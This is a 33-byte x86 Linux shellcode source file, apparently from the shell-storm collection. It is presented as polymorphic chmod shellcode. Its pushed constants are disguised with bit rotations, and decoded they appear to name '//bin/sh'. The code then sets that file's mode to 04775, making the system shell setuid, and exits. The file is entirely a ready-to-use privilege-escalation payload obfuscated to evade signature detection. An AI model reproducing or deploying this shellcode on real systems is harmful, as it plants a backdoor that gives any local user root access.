; chmod polymorphic http://shell-storm.org/shellcode/files/shellcode-550.php
; 33 bytes
; Author: rikih gunawan

global _start

_start:
    xor eax,eax
    push ecx
    push dword 0x343997b7
    rol dword [esp], 1
    push dword 0xd2c45e5e ; rol, 1
    ror dword [esp], 1
    mov ebx,esp

    mov cx,0x9fd    ; 04775
    mov al,0xf      ; sys_chmod
    int 0x80

    mov al,0x1
    int 0x80
